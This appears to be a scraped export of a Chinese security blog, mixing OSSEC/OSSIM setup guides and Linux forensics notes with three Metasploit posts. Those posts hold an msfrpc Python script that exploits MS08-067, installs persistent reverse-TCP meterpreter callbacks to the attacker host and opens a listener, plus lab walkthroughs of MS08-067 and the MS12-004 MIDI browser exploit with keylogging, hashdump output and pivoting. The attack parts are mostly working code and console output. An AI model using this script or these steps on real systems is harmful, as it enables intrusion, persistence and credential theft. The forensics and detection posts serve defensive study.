** Для инструкций по установке на русском ,введите [ru]. ** Za instalaciju na srpskom, izaberi [sr]. ** Türkçe kurulum için seçin [tr]. (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cnwhich: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin) 安装完成标识 12345678感谢使用 OSSEC HIDS. 如果您有任何疑问,建议或您找到任何bug, 请通过 contact@ossec.net 或邮件列表 ossec-list@ossec.net 联系我们.( http://www.ossec.net/en/mailing_lists.html ).您可以在 http://www.ossec.net 获得更多信息--- 请按 ENTER 结束安装 (下面可能有更多信息). ---直到碰到上面内容，说明安装完成。 配置服务端，使其工作正常 执行下面命令启用数据库支持1[root@CentOS-6 bin]# /var/ossec/bin/ossec-control enable database 导入MySQL表结构到MySQL中1[root@CentOS-6 bin]# mysql -uossec -p ossec &lt; ~/ossec-hids-2.8.3/src/os_dbd/mysql.schema 修改部分配置文件的权限，否则会启动服务失败：1[root@CentOS-6 etc]# chmod u+w /var/ossec/etc/ossec.conf 启动服务 12[root@CentOS-6 /]# /etc/init.d/ossec-hids startStarting ossec-hids: [确定]","tags":[{"name":"OSSEC","slug":"OSSEC","permalink":"http://yoursite.com/tags/OSSEC/"}]},{"title":"[Demo] MSF检测指定服务的漏洞","date":"2016-08-11T15:00:13.000Z","path":"sec/Demo-MSF检测指定服务的漏洞/","text":"#相关资源 SpiderLabs/msfrpc Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# -*- coding: utf-8 -*-'''用MSF检测指定服务的漏洞本脚本以 MS08-067为例'''__author__ = \"SanNa\"import osimport msfrpcimport optparseimport sysfrom time import sleepLOGIN = 'msf'PASSWD = 'abc123'def builder(RHOST, LHOST, LPORT): '''根据相关信息创建文件 :param RHOST: 目标ip :param LHOST: 监听IP :param LPORT: 监听端口 ''' postcomms = \"\"\"getsystem run persistence -S -U -X -i 10 -p 80 -r \"\"\"+LHOST+\"\"\" cd c:\\\\ upload /tmp/ms08067_patch.exe c:\\\\ upload /tmp/ms08067_install.bat c:\\\\ execute -f ms08067_install.bat \"\"\" batcomm = \"ms08067_patch.exe /quiet\" with open ('/tmp/smbpost.rc', 'w') as post, open('/tmp/ms08067_install.bat', 'w') as bat: post.write(postcomms) bat.write(batcomm)def sploiter(RHOST, LHOST, LPORT, session): '''连接到msfconsole :param RHOST: 目标ip :param LHOST: 监听IP :param LPORT: 监听端口 :param session: session ''' client = msfrpc.Msfrpc(&#123;&#125;) client.login(LOGIN, PASSWD) ress = client.call('console.create') console_id = ress['id'] # Exploit MS08-067 commands = \"\"\"use exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/meterpreter/reverse_tcp set RHOST \"\"\"+RHOST+\"\"\" set LHOST \"\"\"+LHOST+\"\"\" set LPORT \"\"\"+LPORT+\"\"\" set ExitOnSession false exploit -z \"\"\" print \"[+] Exploiting MS08-067 on: \" + RHOST client.call('console.write',[console_id,commands]) res = client.call('console.read',[console_id]) result = res['data'].split('\\n') # 运行攻击脚本 runPost = \"\"\"use post/multi/gather/run_console_rc_file set RESOURCE /tmp/smbpost.rc set SESSION \"\"\"+session+\"\"\" exploit \"\"\" print \"[+] Running post-exploit script on: \" + RHOST client.call('console.write',[console_id,runPost]) rres = client.call('console.read',[console_id]) #Setup Listener for presistent connection back over port 80 sleep(10) listen = \"\"\"use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LPORT 80 set LHOST \"\"\"+LHOST+\"\"\" exploit \"\"\" print \"[+] Setting up listener on: \" + LHOST + \":80\" client.call('console.write',[console_id,listen]) lres = client.call('console.read',[console_id]) print lresdef main(): parser = optparse.OptionParser(sys.argv[0] +\\ ' -p LPORT -r RHOST -l LHOST -s session') parser.add_option('-p', dest='LPORT', type='string', \\ help ='specify a port to listen on') parser.add_option('-r', dest='RHOST', type='string', \\ help='Specify a remote host') parser.add_option('-l', dest='LHOST', type='string', \\ help='Specify a local host') parser.add_option('-s', dest='session', type='string', \\ help ='specify session ID') (options, args) = parser.parse_args() session=options.session RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT if (RHOST == None) and (LPORT == None) and (LHOST == None): print parser.usage sys.exit(0) builder(RHOST, LHOST, LPORT) sploiter(RHOST, LHOST, LPORT, session)if __name__ == \"__main__\": main() 执行方式12345➜ ~ python 333msf.py -p 4444 -r 192.168.1.43 -l 192.168.1.8 -s 8[+] Exploiting MS08-067 on: 192.168.1.43[+] Running post-exploit script on: 192.168.1.43[+] Setting up listener on: 192.168.1.8:80[&#123;\"prompt\": \"\\u0001\\u0002msf\\u0001\\u0002 post(\\u0001\\u0002\\u0001\\u0002run_console_rc_file\\u0001\\u0002) \\u0001\\u0002&gt; \", \"busy\": true, \"data\": \"PAYLOAD =&gt; windows/meterpreter/reverse_tcp\\nRHOST =&gt; 192.168.1.43\\nLHOST =&gt; 192.168.1.8\\nLPORT =&gt; 4444\\nExitOnSession =&gt; false\\n[*] Started reverse TCP handler on 192.168.1.8:4444 \\n[*] Automatically detecting the target...\\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\\n[*] Attempting to trigger the vulnerability...\\n[*] Sending stage (957487 bytes) to 192.168.1.43\\n[*] Meterpreter session 8 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1139) at 2016-06-03 21:13:38 +0800\\n[*] Session 8 created in the background.\\nRESOURCE =&gt; /tmp/smbpost.rc\\nSESSION =&gt; 7\\n[*] Running module against DH-CA8822AB9589\\n[*] Running command getsystem\\n[*] Running command run persistence -S -U -X -i 10 -p 80 -r 192.168.1.8\\n\"&#125;] 执行脚本时msf端命令行回显123456789101112[*] Running Persistance Script[*] Resource file for cleanup created at /root/.msf7/logs/persistence/DH-CA8822AB9589_20160603.2703/DH-CA8822AB9589_20160603.2703.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=80[*] Persistent agent script is 148419 bytes long[+] Persistent Script written to C:\\WINDOWS\\TEMP\\IezQttslf.vbs[*] Executing script C:\\WINDOWS\\TEMP\\IezQttslf.vbs[+] Agent executed with PID 2720[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DIwbwLlJMJ[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DIwbwLlJMJ[*] Installing as service..[*] Creating service YsimPwZAk[*] Meterpreter session 3 opened (192.168.1.8:80 -&gt; 192.168.1.43:1083) at 2016-06-03 18:27:06 +0800 session12345678910111213msf &gt; sessionsActive sessions=============== Id Type Information Connection -- ---- ----------- ---------- 7 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:80 -&gt; 192.168.1.43:1138 (192.168.1.43) 8 meterpreter x86/win32 NT AUTHORITY\\SYSTEM @ DH-CA8822AB9589 192.168.1.8:4444 -&gt; 192.168.1.43:1139 (192.168.1.43)msf &gt; sessions -i 8[*] Starting interaction with 6... 相关操作12345678910111213141516171819202122232425262728meterpreter &gt; sysinfoComputer : DH-CA8822AB9589OS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : en_USDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/win32meterpreter &gt; shellProcess 3492 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.1.43 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1C:\\Documents and Settings\\Administrator&gt;","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Test-MS08-067","date":"2016-08-10T13:44:42.000Z","path":"sec/Test-MS08-067/","text":"环境1234Kali2.0192.168.1.8WinXPenSP3192.168.1.43 Start123msf auxiliary(syn) &gt; use exploit/windows/smb/ms08_067_netapimsf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcp Show Option12345678910111213141516171819202122232425msf exploit(ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic Targeting Set Option1234msf exploit(ms08_067_netapi) &gt; set RhOST 192.168.1.43RhOST =&gt; 192.168.1.43msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.1.8LHOST =&gt; 192.168.1.8 Exploit123456789101112131415161718msf exploit(ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 192.168.1.8:4444[*] Automatically detecting the target...[*] Fingerprint: Windows XP - Service Pack 3 - lang:English[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] Attempting to trigger the vulnerability...[*] Sending stage (957487 bytes) to 192.168.1.43[*] Meterpreter session 1 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1115) at 2016-06-03 14:18:57 +0800meterpreter &gt; lsListing: C:\\WINDOWS\\system32============================Mode Size Type Last modified Name---- ---- ---- ------------- ----100666/rw-rw-rw- 1482 fil 2011-08-14 13:40:01 +0800 $winnt$.inf40777/rwxrwxrwx 0 dir 2011-08-14 21:19:31 +0800 1025 Shell1234567891011121314151617181920meterpreter &gt; shellProcess 1004 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.1.43 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1C:\\WINDOWS\\system32&gt; 常用手法截屏12meterpreter &gt; screenshotScreenshot saved to: /root/Fyjiynwg.jpeg 获取系统信息12345678meterpreter &gt; sysinfoComputer : DH-CA8822AB9589OS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : en_USDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/win32 目标系统正在运行的进程1234567891011meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 NT AUTHORITY\\SYSTEM 128 676 VMUpgradeHelper.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMUpgradeHelper.exe 560 4 smss.exe x86 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 键盘记录 使用migrate将会话迁移至explorer.exe(pid)进程中再启动keylog_recorder模块，需要终止时CTRL+C 123456789101112meterpreter &gt; migrate 1652[*] Migrating from 1032 to 1652...[*] Migration completed successfully.meterpreter &gt; run post/windows/capture/keylog_recorder[*] Executing module against DH-CA8822AB9589[*] Starting the keystroke sniffer...[*] Keystrokes being saved in to /root/.msf7/loot/20160603143131_default_192.168.1.43_host.windows.key_581630.txt[*] Recording keystrokes...^C[*] Saving last few keystrokes...[*] Interrupt[*] Stopping keystroke sniffer... 获取密码哈希值12345678meterpreter &gt; hashdumpAdministrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:32f842845a64f17ccbe6b10315169b7e:83789c0d8506a618d815fd9c6fb379e1:::IUSR_DH-CA8822AB9589:1003:de8b8cec054052bb8ab2d451a3e61856:145f992fa5ff125301520f8e27419c6d:::IWAM_DH-CA8822AB9589:1004:90b05d38a1fc8d80a4ae31c7bc961352:2f950167d2942f7c977fdfd1857b8a59:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bb5a5a239a6e521be591fdf091b05013:::meterprete 将目标机器作为跳板1234567891011121314meterpreter &gt; run get_local_subnetsLocal subnet: 192.168.1.0/255.255.255.0meterpreter &gt; background[*] Backgrounding session 1...msf exploit(ms08_067_netapi) &gt; route add 192.168.3.0 255.255.255.0 1[*] Route addedmsf exploit(ms08_067_netapi) &gt; route printActive Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 192.168.3.0 255.255.255.0 Session 1","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Metasploit-MIDI文件解析远程代码执行","date":"2016-08-09T14:40:46.000Z","path":"sec/Metasploit-MIDI文件解析远程代码执行/","text":"启动msf1234567[*] Processing setup.rc for ERB directives.resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msfresource (setup.rc)&gt; load msgrpc User=msf Pass='abc123'[*] MSGRPC Service: 127.0.0.1:55552[*] MSGRPC Username: msf[*] MSGRPC Password: abc123[*] Successfully loaded plugin: msgrpc 搜索和使用漏洞模块123456789101112msf &gt; search 12-004[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/browser/ms12_004_midi 2012-01-10 normal MS12-004 midiOutPlayNextPolyEvent Heap Overflowmsf &gt; use exploit/windows/browser/ms12_004_midi 显示和设置相关Option123456789101112131415161718192021222324252627282930313233msf exploit(ms12_004_midi) &gt; show optionsModule options (exploit/windows/browser/ms12_004_midi): Name Current Setting Required Description ---- --------------- -------- ----------- OBFUSCATE false no Enable JavaScript obfuscation SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random)Exploit target: Id Name -- ---- 0 Automaticmsf exploit(ms12_004_midi) &gt; set SRVHOST 192.168.1.8SRVHOST =&gt; 192.168.1.8msf exploit(ms12_004_midi) &gt; set URIPATH /URIPATH =&gt; /msf exploit(ms12_004_midi) &gt; set LPORT 1234LPORT =&gt; 1234msf exploit(ms12_004_midi) &gt; exploit[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.1.8:1234[*] Using URL: http://192.168.1.8:8080/[*] Server started. 使用目标主机IE浏览器打开URL后控制台输出为1234567891011*] 192.168.1.43 ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)[*] 192.168.1.43 ms12_004_midi - Sending html to 192.168.1.43:2933...[*] 192.168.1.43 ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503[*] 192.168.1.43 ms12_004_midi - Sending midi corruption file...[*] Sending stage (957487 bytes) to 192.168.1.43[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript 'migrate -f'[*] Current server process: iexplore.exe (372)[*] Spawning notepad.exe process to migrate to[+] Migrating to 3948[+] Successfully migrated to process 查看和使用session1234567891011121314151617181920212223242526272829303132333435363738sf exploit(ms12_004_midi) &gt; sessionsActive sessions=============== Id Type Information Connection -- ---- ----------- ---------- 1 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43) 2 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)msf exploit(ms12_004_midi) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt; ifconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler MiniportHardware MAC : 00:0c:29:84:07:87MTU : 1500IPv4 Address : 192.168.1.43IPv4 Netmask : 255.255.255.0meterpreter &gt; shellProcess 204 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator\\Desktop&gt;","tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"OSSIM-Add-Linux-Agent","date":"2016-07-21T14:01:40.000Z","path":"sec/OSSIM-Add-Linux-Agent/","text":"OSSIM 添加 Linux代理 Env CentOS6.6 操作方法见 官网干净的CentOS需要 先安装好wget 和gcc 下载源码安装1234 wget https://bintray.com/artifact/download/ossec/ossec-hids/ossec-hids-2.8.3.tar.gztar -zxvf ossec-hids-2.8.3.tar.gzcd ossec-hids-2.8.3bash install.sh 然后就是根据提示进行安装， 提取Key到agent文件(/var/ossec/binmanage_agents) 选择语言 提示安装gcc 选择安装模式 agent4.相关信息设置默认就好5.根据相关情况填入Service IP或者主机名……安装成功后会给出服务启动和关闭的一些命令信息123456789- 已正确完成系统配置.- 要启动 OSSEC HIDS: /var/ossec/bin/ossec-control start- 要停止 OSSEC HIDS: /var/ossec/bin/ossec-control stop- 要查看或修改系统配置,请编辑 /var/ossec/etc/ossec.conf 在OSSIM Web 端添加Agent Environment &gt; Detection&gt;HIDS &gt; Agents &gt; Agent Control &gt; Add Agent.选择相应主机后 Save 提取Key到agent文件(/var/ossec/binmanage_agents) agent启动成功 ) 然后可在OSSIM中看到该Agent相关信息","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"OSSIM","slug":"OSSIM","permalink":"http://yoursite.com/tags/OSSIM/"}]},{"title":"OSSIM-GNOME-GUIDE","date":"2016-07-20T11:57:59.000Z","path":"sec/OSSIM-GNOME-GUIDE/","text":"修改源列表 由于Gnome较大，所以使用国内源，放在文件最前面 1vim /etc/apt/sources.list 123456deb http://mirrors.ustc.edu.cn/debian jessie main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian jessie main contrib non-freedeb http://mirrors.ustc.edu.cn/debian jessie-proposed-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian jessie-proposed-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian jessie-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian jessie-updates main contrib non-free 更新系统1apt-get update 安装Gnome环境12apt-get install gnomeapt-get install xserver-xorg 安装FVWM环境1apt-get install x-window-system-core fvwm 解决单列用户模式 vim /boot/grub/grub.cfg1修改 set timeout=0,值为5~10之间都OK 允许Root用户登录 进入/etc/pam.d/gdm3目录 找到相应文件 注释掉如下两行12./gdm-autologin:3:auth required pam_succeed_if.so user != root quiet_success./gdm-password:3:auth required pam_succeed_if.so user != root quiet_success 启动图形界面123init 2service gdm3 restartservice gdm3 start 删除相应deb文件 由于Gnome相关文件较大，安装结束后为了节省磁盘空间我们删除相关deb文件1rm /var/cache/apt/archives/*.deb tips 磁盘空间实际环境500GB 到2T相关版本changeloghttps://www.alienvault.com/forums/discussion/7242/ 汉化 李晨光-51CTO博客","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"OSSIM","slug":"OSSIM","permalink":"http://yoursite.com/tags/OSSIM/"}]},{"title":"Linux取证分析","date":"2016-06-26T13:26:12.000Z","path":"sec/Linux取证分析/","text":"进程隐藏相关原理原理 目前在 Linux 上隐藏进程的技术主要有两种 1( 1) 类似于 ps、top 等的命令能够列出包括 init 在内的所有重要的系统进程, 通过对他们的实现过程进行改造来实现进程隐藏, 具体做法是“劫持”ps 的关键系统调用 sys_getdents( ), 从而无法查看包含进程信息的目录。 1( 2) ps 命令实际是通过读取 proc文件系统来向用户返回进程信息的, 而 proc 文件系统是通过文件系统( VFS) 接口来实现的, 因此通过劫持文件系统操作函数集( inode_operation 和 file_operations) 中的有关函数, 使得进程信息无法通过文件系统接口输出给用户。 以上两种方法虽然都可实现进程隐藏, 但均是在较高的层次上实现的,方法 1 虽然在 ps 时看似隐藏了某个进程, 但在 proc中该进程仍然对用户可见 方法 2 是在 VFS 层对内核函数的劫持, 意味着需要先判断输出的系统信息是与进程有关的还是与进程无关的( 与进程无关的并无隐藏的必要)并且这两种方法都无法满足仅对进程部分信息隐藏的需求, 在实际应用中不够灵活。实际上, 用户对进程信息的访问, 都是通过proc 文件系统完成的, 因此, 实现进程隐藏的根本途径是从 proc 入手, 准确地找出进程信息产生的关键点, 在这些关键点上做一些特殊的处理, 从而达到实现进程隐藏的目的。 Proc文件系统简介1proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。 1基于/proc 文件系统如上所述的特殊性，其内的文件也常被称作虚拟文件，并具有一些独特的特点。例如，其中有些文件虽然使用查看命令查看时会返回大量信息，但文件本身的大小却会显示为 0 字节。此外，这些特殊文件中大多数文件的时间及日期属性通常为当前系统时间和日期，这跟它们随时会被刷新（存储于 RAM 中）有关。 1为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi 目录中存储的就是当前系统上所有 SCSI 设备的相关信息，/proc/N 中存储的则是系统当前正在运行的进程的相关信息，其中 N 为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。 1大多数虚拟文件可以使用文件查看命令如 cat、more 或者 less 进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如 apm、free、lspci 或 top 查看时却可以有着不错的表现。 Proc文件系统目录结构 目录名称 目录内容 apm 高级电源管理信息 cmdline 内核命令行 Cpuinfo 关于 Cpu 信息 Devices 可以用到的设备（块设备/字符设备） Dma Used DMS channels Filesystems 支持的文件系统 Interrupts 中断的使用 Ioports I/O 端口的使用 Kcore 内核核心印象 Kmsg 内核消息 Ksyms 内核符号表 Loadavg 负载均衡 Locks 内核锁 Meminfo 内存信息 Misc Miscellaneous Modules 加载模块列表 Mounts 加载的文件系统 Partitions 系统识别的分区表 Rtc Real time clock Slabinfo Slab pool info Stat 全面统计状态表 s Swaps 对换空间的利用情况 Version 内核版本 Uptime 系统正常运行时间 进程信息的创建过程 结合实际情况, 一个用户查看某个进程的信息有两种情形 123( 1) 用 cat 之类的命令直接读取进程目录下的节点文件( 2) 用 ls 之类的命令列举所有的进程目录proc 对于这两种方式分别有不同的处理对于 ls 命令是调用 VFS 的 readdir( ) , 而对于cat 命令则会发生对一系列 lookup 函数的调用。 进程隐藏的实现 通过以上对 proc 文件系统中生成进程信息实现过程的分析, 我们发现由于 Linux 缺乏模块化,难以找到一个统一的入口, 准确地对进程信息实现隐藏, 必须对实际应用中可能出现的情形 用 cat之类的命令直接读取进程目录下的节点文件和用 ls之类的命令列举所有的进程目录, 分别加以考虑。1对函数 proc_pid_lookup 进行修改: 在步骤a 的末尾添加代码, 用于判断该进程号是否为隐藏进程的进程号, 如果是, 则跳转到我们定制的一个函数, 该函数可打印出? 该进程无法查看?之类的调试信息后返回上层调用者; 如果否, 则照常执行步骤b、c 1对函数 proc_pid_readdir 进行修改: 在步骤b 中, 当获取一个进程后, 先判断该进程是否为隐藏进程, 如果是则跳转到我们定制的一个函数, 打印出? 该进程无法查看?之类的调试信息后返回上层调用者; 如果否, 则照常执行步骤 b、c。对于进程部分信息的隐藏, 通过文章第 2 部分的分析, 实际上是选择数组 tgid_base_stuff 中哪些节点不被创建的问题, 对它的实现也要包括以下两部分: 1( 1) 对函数 proc_pident_lookup 进行修改: 在步骤 a 开始前添加代码, 用于判断要创建的节点是否为需隐藏的节点, 如果是, 则跳转到我们定制的一个函数, 打印出? 该节点无法查看?之类的调试信息后返回上层调用者; 如果否, 则照常执行步骤 b。 1( 2) 对函数 proc_pident_readdir 进行修改: 在步骤 a 的末尾添加代码, 用于判断要创建的节点是否为需隐藏的节点, 如果是, 则跳转到我们定制的一个函数, 打印出? 该节点无法查看?之类的调试信息后转到步骤 c; 如果否, 则照常执行步骤 b、c。 结论1进程隐藏是实现进程保护的一种简单可行的方法之一, 虽然可以在从 proc 到 vfs 的各个层次上容易实现对某个进程的隐藏, 但是如果需要对进程部分信息灵活地进行隐藏, 必须在 proc 层准确地找出进程目录以及其下节点生成的关键点, 在这些关键点上来实现进程隐藏。由于 Linux 缺乏模块化的缺点, 在列举目录和查看节点文件时没有统一的入口点, 而这两种对进程信息的访问都会涉及到进程信的生成, 因此, 需要在内核中对每个进程目录或节点文件生成的地方一一做处理。本方法在内核级上分别实现了对进程全部信息以及进程部分信息的隐藏, 如能根据实际需求, 结合一定的隐藏策略, 比如指定某个系统中哪些进程应该被隐藏, 则在实际应用中更具价值。 网络异常排查方法Windows排查 查看目前的网络连接情况，定位可疑网络连接（结合业务访问排查）1netstat -b -n (管理员权限) 通过网络连接进一步确认可疑连接的PID 1netstat -ano 根据PID确定是那个进程 1tasklist | findstr xxx 确定此进程的用途以及可否杀死 1taskkill /T /F /PID 3036 其他 1若以上几步没有解决，使用PC Hunter（基于XueTr源码重新开发）工具对其进行深度排查 Linux排查 确定系统自身的命令是否被恶意替换，如ls、netstat 1使用chkrootkit、rkhunter类工具检查下是否存在恶意程序及恶意替换 查看linux自身的网络连接，并定位可疑程序的PID 1netstat -antpl 根据pid查找执行文件的及其路径 1lsof -p PID 进一步排查 12cd /proc/pidnumberls -ail 杀掉对应恶意程序或进程 121 可将/proc/pidnumber 下的恶意程序直接rm –rf2 根据进程号直接杀死进程 kill -9 pidnumber 其他一些可能用到的命令 12341 分析access.log获得访问前10位的ip地址awk &apos;&#123;print $1&#125;&apos; access.log |sort|uniq -c|sort -nr|head -102 查看连接某服务端口最多的的IP地址netstat -nat | grep &quot;192.168.1.15:1234&quot; |awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -20 tips一些框架(工具)内存取证工具 Volatility Github介绍：http://www.freebuf.com/articles/system/26763.html 获取木马配置文件通过python脚本来获取木马中的配置文件，诸如ftp、ssh等信息，反向对黑客进行攻击。目前支持Adwind、Adzok、Albertino Advanced RAT等40多个木马。RATDecoders Github 远程现场取证的事件应急响应框架一个被安装在目标系统的Python 代理客户端，可以对Python基础设施进行管理和交流。GRR Rapid Response Github 隐藏进程检测工具Linux Rootkit (vfs hook) 是一个linux内核模块，是用于检测rootkit的一个小demo。通过读取此内核模块创建的虚拟文件，可检测通过Hook vfs 函数来隐藏的进程。大家可把他作为一个单一的检测工具，也可以集成到诸如OSSEC等HIDS里，通过周期性任务触发来检测并上报可疑事件。 使用方法：12照例就是解压之后 编译加载就好。unzip process_list.zip;cd process_list;make;make install 相关命令系统：123456789uname -a 查看内核/操作系统/CPU信息cat /etc/issuecat /etc/redhat-release 查看操作系统版本cat /proc/cpuinfo 查看CPU信息hostname 查看计算机名lspci -tv 列出所有PCI设备lsusb -tv 列出所有USB设备lsmod 列出加载的内核模块env 查看环境变量 资源：1234567free -m 查看内存使用量和交换区使用量df -h 查看各分区使用情况du -sh &lt;目录名&gt; 查看指定目录的大小grep MemTotal /proc/meminfo 查看内存总量grep MemFree /proc/meminfo 查看空闲内存量uptime 查看系统运行时间、用户数、负载cat /proc/loadavg 查看系统负载 磁盘和分区：12345mount | column -t 查看挂接的分区状态fdisk -l 查看所有分区swapon -s 查看所有交换分区hdparm -i /dev/hda 查看磁盘参数(仅适用于IDE设备)dmesg | grep IDE 查看启动时IDE设备检测状况 网络：123456ifconfig 查看所有网络接口的属性iptables -L 查看防火墙设置route -n 查看路由表netstat -lntp 查看所有监听端口netstat -antp 查看所有已经建立的连接netstat -s 查看网络统计信息 进程：12ps -ef 查看所有进程top 实时显示进程状态（另一篇文章里面有详细的介绍） ps命令可以列出正在运行的进程。以下命令可以列出当前系统上所有正在运行的进程：1ps -A 这个命令列出的信息也许太多，不便于查看。你可以使用less命令通过一个管道输出，分页查看：1ps -A | less 你也可以使用grep来对来做管道输出，查找出某个进程。例如，查找Firefox进程：1ps -A | grep firefox 以树形显示进程1pstree命令同样可以显示进程信息，不过它是以树形式显示进程。 pgrep给定一个搜索关键词，pgrep命令会返回所有匹配这个关键词的进程ID。12 pgrep iceweasel 2074 也可以将这个命令与kill命令结合起来干掉一个特定的进程12➜ ~ kill $(pgrep iceweasel)➜ ~ 或者使用 12➜ ~ pkill iceweasel➜ ~ 用户：123456w 查看活动用户id &lt;用户名&gt; 查看指定用户信息last 查看用户登录日志cut -d: -f1 /etc/passwd 查看系统所有用户cut -d: -f1 /etc/group 查看系统所有组crontab -l 查看当前用户的计划任务 服务：12chkconfig –list 列出所有系统服务chkconfig –list | grep on 列出所有启动的系统服务 程序：1rpm -qa 查看所有安装的软件包 相关文章 Linux入侵取证：从一次应急事件讲起 Linux下基于内存分析的Rootkit检测方法 如何分析 Linux 